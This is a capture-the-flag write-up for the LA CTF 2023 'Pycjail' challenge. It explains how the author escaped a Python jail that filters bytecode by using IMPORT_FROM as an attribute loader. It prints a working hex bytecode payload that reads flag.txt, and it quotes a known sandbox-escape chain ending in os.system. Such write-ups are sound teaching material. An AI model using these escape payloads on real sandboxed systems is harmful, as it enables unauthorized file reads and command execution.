---
title: LA CTF 2023 – Pycjail
date: '2023-02-12'
draft: false
authors: ['legoclones']
tags: ['LACTF 2023', 'Misc', 'Python', 'Pyjail', 'Sandbox', 'Opcode']
summary: 'Use bytecode manipulation to subvert jail restrictions.'
canonical: 'https://justinapplegate.me/2023/lactf-pycjail'
---

## Pycjail (Misc, 495 Points)

> All of you think you’re so cute with your fancy little sandbox bypasses, but jokes on you I’ve started filtering the bytecode! I’d like to see you bypass this!
>
> Note: The program is being run in the python:3.10-slim-bullseye Docker image on the server.
>
> Attachment: [main.py](https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/main.py)

This challenge required you to bypass a Python jail, which limited several aspects of a custom `code` object you created. The source code:

```python
#!/usr/local/bin/python3
import opcode
import inspect

def f():
    pass

banned = ["IMPORT_NAME", "MAKE_FUNCTION"]
for k in opcode.opmap:
    if (
        ("LOAD" in k and k != "LOAD_CONST")
        or "STORE" in k
        or "DELETE" in k
        or "JUMP" in k
    ):
        banned.append(k)
banned = {opcode.opmap[x] for x in banned}

consts = tuple(input("consts: ").split(","))
names = tuple(input("names: ").split(","))
code = bytes.fromhex(input("code: "))
if len(consts) > 3:
    print("too many consts >:(")
elif len(names) > 4:
    print("too many names >:(")
elif len(code) > 30:
    print("too much code >:(")
elif len(code) % 2 != 0:
    print("invalid code >:(")
elif any(code[i] in banned for i in range(0, len(code), 2)):
    print("banned opcode >:(")
elif any(code[i] > 3 for i in range(1, len(code), 2)):
    print("I never learned how to count past 3 >:(")
else:
    f.__code__ = f.__code__.replace(
        co_stacksize=10,
        co_consts=consts,
        co_names=names,
        co_code=code,
    )
    print("here goes!")
    frame = inspect.currentframe()
    p = print
    r = repr
    for k in list(frame.f_globals):
        if k not in ("p", "r", "f"):
            del frame.f_globals[k]
    p(r(f()))
```

To summarize the code above, you provided the `co_consts`, `co_names`, and `co_code` bytes for a custom `code` object that was created and ran. The restrictions imposed were:

- max 3 consts
- max 4 names
- max 15 opcodes
- opcodes can’t be in `['IMPORT_NAME', 'MAKE_FUNCTION', 'STORE_SUBSCR', 'DELETE_SUBSCR', 'LOAD_BUILD_CLASS', 'LOAD_ASSERTION_ERROR', 'STORE_NAME', 'DELETE_NAME', 'STORE_ATTR', 'DELETE_ATTR', 'STORE_GLOBAL', 'DELETE_GLOBAL', 'LOAD_NAME', 'LOAD_ATTR', 'JUMP_FORWARD', 'JUMP_IF_FALSE_OR_POP', 'JUMP_IF_TRUE_OR_POP', 'JUMP_ABSOLUTE', 'POP_JUMP_IF_FALSE', 'POP_JUMP_IF_TRUE', 'LOAD_GLOBAL', 'JUMP_IF_NOT_EXC_MATCH', 'LOAD_FAST', 'STORE_FAST', 'DELETE_FAST', 'LOAD_CLOSURE', 'LOAD_DEREF', 'STORE_DEREF', 'DELETE_DEREF', 'LOAD_CLASSDEREF', 'LOAD_METHOD']` (aka no import/makefunc/load/store/delete/jump)
- opcode values can’t be > 3

Nothing about the flag was mentioned, so it was likely in `/flag.txt` or `./flag.txt`, or if they were evil they’d require you to get RCE to read the flag. I was banking on the fact that it was stored in `/flag.txt` or `./flag.txt`, so my goal was to get arbitrary read.

### Approaching the Problem

I made a [list](https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/allowed.txt) of all the Python 3.10 opcodes that _were_ allowed in this jail by pulling from [the documentation](https://docs.python.org/3.10/library/dis.html) and removing the opcodes banned in the list above. What caught my eye initially was that the opcodes `CALL_FUNCTION` and `CALL_METHOD` were **not** banned, and this is what allows you to call a function on the stack. However, the hard part was _getting_ a callable object on the stack in the first place. The opcodes `LOAD_GLOBAL`, `LOAD_NAME`, `LOAD_METHOD`, and `LOAD_ATTR` are typically used to get a function on the stack, and all `LOAD` opcodes were blocked except for `LOAD_CONST` (which only allowed us to put strings on the stack). As an example, below shows the bytecode for the line `open("flag.txt").read()`:

```python
>>> dis.dis(compile('open("flag.txt").read()','pycjail','eval'))
  1           0 LOAD_NAME                0 (open)
              2 LOAD_CONST               0 ('flag.txt')
              4 CALL_FUNCTION            1
              6 LOAD_METHOD              1 (read)
              8 CALL_METHOD              0
             10 RETURN_VALUE
```

To test various payloads with the provided `main.py` script, I created this small script to give me the info I want:

```python3
import dis

code_str = 'print("a")'
code = compile(code_str, '<string>', 'exec')

dis.dis(code)

print("\nconsts: ", code.co_consts)
print("names: ", code.co_names)
print("code: ", code.co_code.hex())
```

Based on the provided `code_str`, it would show me a disassembly of the code, along with `co_consts`, `co_names`, and `co_code` in the form desired.

Now that I was set up to try stuff, I went through the Python bytecode documentation, opcode by opcode, trying to see if there was anything that would put a callable on the stack. Many of the opcodes were eliminated from the start, such as `BINARY_*`, `UNARY_*`, `INPLACE_*`, `POP_*`, `ROT_*`, and `DUP_*`. `CALL_*` were going to be useful later on, but wouldn’t help us get a callable onto the stack. After spending about an hour with a teammate looking through the opcodes, we felt like there wasn’t anything there. So we did what anyone would do and asked ChatGPT (no, it wasn’t helpful).

![ChatGPT For the Rescue?](https://raw.githubusercontent.com/Legoclones/website/main/source/static/lactf-pycjail/chatgpt.png)

### Turning Point

Desperate, we did some more research online with CTF writeups until I came across [a write-up by kmh from DiceCTF 2021](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak). The challenge `TI-1337 Plus CE` was also a pyjail, and one of the things I learned was that "`IMPORT_FROM` is `LOAD_ATTR` in disguise!".

The opcode `IMPORT_FROM` was **not banned**, but we hadn’t paid much attention to it because it always follows (and only functions properly with) the opcode `IMPORT_NAME`, which was banned. However, if we could use it to function as `LOAD_ATTR`, then that means we could get a callable onto the stack, and through attribute stacking run some code like `"".__class__.__base__.__subclasses__()[144]()._module.__builtins__["eval"]("insert code here")`.

It was also apparent that since using `IMPORT_FROM` in place of `LOAD_ATTR` isn’t any default behavior for the Python interpreter, we would have to manually create custom bytecode to be successful. This actually made sense; normally, pyjails just ask for a line of code (single `input()` call), but this one had you specify certain parts of the `code` object you wanted to create. However, understanding the Python bytecode wouldn’t be _typical_ or even perhaps **technically compliant** explained the challenge author’s design choice.

Manual testing confirmed our suspicion that `IMPORT_FROM` worked as desired, so it was now time to create a payload.

### Developing a Payload With Restrictions

A lot of testing and trial & error was performed at this point to get a payload that would work. Getting the payload `"".__class__.__base__.__subclasses__` to work was fairly simple, however we ran into errors doing `"".__class__.__base__.__subclasses__()`.

```bash
$ python3 main.py
consts: ''
names: __class__,__base__,__subclasses__
code: 64006d006d016d025300
here goes!
<built-in method __subclasses__ of type object at 0x55bf92bc3640>

$ python3 main.py
consts: ''
names: __class__,__base__,__subclasses__
code: 64006d006d016d02a1005300
here goes!
Traceback (most recent call last):
  File "/home/justin/tmp/lactf/main.py", line 51, in <module>
    p(r(f()))
  File "/home/justin/tmp/lactf/main.py", line -1, in f
TypeError: object() takes no arguments
```

The opcode used above was `CALL_METHOD`, so I tried `CALL_FUNCTION` and it works! Apparently the two ways for calling functions is by pairing `LOAD_METHOD` and `CALL_METHOD`, or `LOAD_ATTR` and `CALL_FUNCTION`.

The next issue we ran into was getting a number on the stack. Because `main.py` used the `input()` function to get the data, everything was treated as a string. Inserting `1` as a const would always have it render as `'1'`. After some research, we settled on the `GET_LEN` opcode, which just ran the `len()` function on the item on top of the stack. Since our first constant was just an empty string, and the actual value of the string didn’t matter (aka `"".__class__` and `"abcd".__class__` are the same), we could load that const onto the stack again and run `GET_LEN` to put the length of that string onto the stack. We could just set the length of the initial string to whatever we want to obtain the desired integer.

However, a second hiccup was encountered that required 2 additional opcodes to bypass. `GET_LEN` pushed the integer we wanted onto the stack, but kept the loaded string on there too, which we didn’t want. I had to insert an extra `ROT_TWO` and `POP_TOP` opcode to switch the order and remove the string from the opcode.

At this point, the payload we had was:

```
Python code: 'aaaa...aaa'.__class__.__base__.__subclasses__()[14]

consts: aaaa...aaa
names: __class__,__base__,__subclasses__
code: 64006d006d016d02830064001e000200010019005300


Disassembly:
6400 -> LOAD_CONST, consts[0] -> 'aaaa...aaa'
6d00 -> IMPORT_FROM, names[0] -> __class__
6d01 -> IMPORT_FROM, names[1] -> __base__
6d02 -> IMPORT_FROM, names[2] -> __subclasses__
8300 -> CALL_FUNCTION
6400 -> LOAD_CONST, consts[0] -> 'aaaa...aaa'
1e00 -> GET_LEN -> 14 or whatever we want
0200 -> ROT_TWO
0100 -> POP_TOP
1900 -> BINARY_SUBSCR
5300 -> RETURN_VALUE
```

We had **2 consts, 1 name, and 4 opcodes** left to get what we wanted, but we had access to [an extensive list of classes](https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/classes.txt) that opened up functionality a lot.

The "stereotypical" payload [from HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins) is to use `''.__class__.__bases__.__subclasses__()[144]()._module.__builtins__['__import__']('os').system('ls')` to run system commands (note that this was slightly modified from the Python2 version, and the exact index of `<class 'warnings.catch_warnings'>` may vary depending on your installation & version). The problem with this payload was it required another 3 names (`_module`, `__builtins__`, `system`) and 3 consts (`'__import__'`, `'os'`, `'ls'`), which we didn’t have. We considered making our first const of length 144 the same as our last const (padding our bash payload with extra `;`s until we reached our desired length), but we still had 2 extra names.

Our second thought was `"".__class__.__base__.__subclasses__()[144]()._module.__builtins__["eval"]("insert code here")`, but that required 2 names and 2 consts (still 1 too many names).

After perusing the list of available classes one by one, I started looking into the class at index 118, which was `<class '_frozen_importlib_external.FileLoader'>`. Looking at this class’s attributes, I saw the function `get_data()`, which required two arguments for the path of a file. Excited, I wrote up and tested the code `("a"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`, and my local flag was printed! This only required 1 extra name and const (we even had one const leftover), and used exactly 4 more opcodes.

### Final Payload

The final payload was:

```
''.__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')

consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt
names: __class__,__base__,__subclasses__,get_data
code: 64006d006d016d02830064001e000200010019006d036401640183025300

6400 -> LOAD_CONST, consts[0] -> 'a'
6d00 -> IMPORT_FROM, names[0] -> __class__
6d01 -> IMPORT_FROM, names[1] -> __base__
6d02 -> IMPORT_FROM, names[2] -> __subclasses__
8300 -> CALL_FUNCTION
6400 -> LOAD_CONST, consts[0] -> 'a'
1e00 -> GET_LEN -> 1
0200 -> ROT_TWO
0100 -> POP_TOP
1900 -> BINARY_SUBSCR
6d03 -> IMPORT_FROM, names[3] -> get_data
6401 -> LOAD_CONST, consts[1] -> 'flag.txt'
6401 -> LOAD_CONST, consts[1] -> 'flag.txt'
8302 -> CALL_FUNCTION
5300 -> RETURN_VALUE
```

And server interaction:

```bash
~/tmp/lactf $ nc lac.tf 31130
consts: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,flag.txt
names: __class__,__base__,__subclasses__,get_data
code: 64006d006d016d02830064001e000200010019006d036401640183025300
here goes!
b'flag{maybe i should_only_allow_nops_next_time}\n'
```

**Flag:** `flag{maybe_i_should_only_allow_nops_next_time}`
